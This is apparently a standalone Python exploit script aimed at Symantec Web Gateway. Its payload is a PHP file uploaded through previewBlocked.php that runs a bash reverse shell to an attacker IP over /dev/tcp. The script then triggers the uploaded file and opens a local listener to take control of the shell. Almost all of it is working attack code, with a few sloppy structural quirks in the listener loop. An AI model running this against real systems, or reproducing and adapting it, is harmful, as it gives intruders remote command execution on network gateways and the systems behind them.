import multiprocessing
import requests


import socket
import telnetlib
import BaseHTTPServer
from threading import Thread
from SimpleHTTPServer import SimpleHTTPRequestHandler
import requests
import sys
from base64 import b64encode

if len(sys.argv) < 2:
        print "Usage: %s <Attacker IP>  <your lister port> " % sys.argv[0]
        print "eg: %s 192.168.11.186 4444 " % sys.argv[0]
        sys.exit(-1)

headers = {'Content-type': 'multipart/form-data; boundary=winsam', "Content-Length" : "204"}
url = "http://192.168.11.199/spywall/previewBlocked.php"
data = """
--winsam
Content-Disposition: form-data; name="new_image"; filename="sam.php"
Content-Type: image/jpg

<?php system("sleep 5 && bash -i >& /dev/tcp/192.168.11.186/4444 0>&1"); ?>
--winsam--
"""
requests.post(url, headers=headers,data=data).text

print "------------------------------RCE--------------------------------"
print "Author : Win Sam"
print "Symantec Web Gateway Multiple Vulnerabilities"
print "File Upload vulnerability lead to Remote Shell\n\n"
url = "http://192.168.11.199/spywall/images/upload/previewLogo.php"
print url
rport=sys.argv[2]
print requests.get(url).text
print "-----------------------------------------------------------------"

p = multiprocessing.Pool(processes = 4)
for i in range(10):
    p.apply_async(requests.get, ['http://192.168.11.199/spywall/images/upload/previewLogo.php'])

    print "(+) starting handler on port %d" % int(rport)
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", int(rport)))
    s.listen(1)
    conn, addr = s.accept()
    print "(+) connection from %s" % addr[0]
    t.sock = conn
    print "(+) pop thy shell!"
    t.interact()
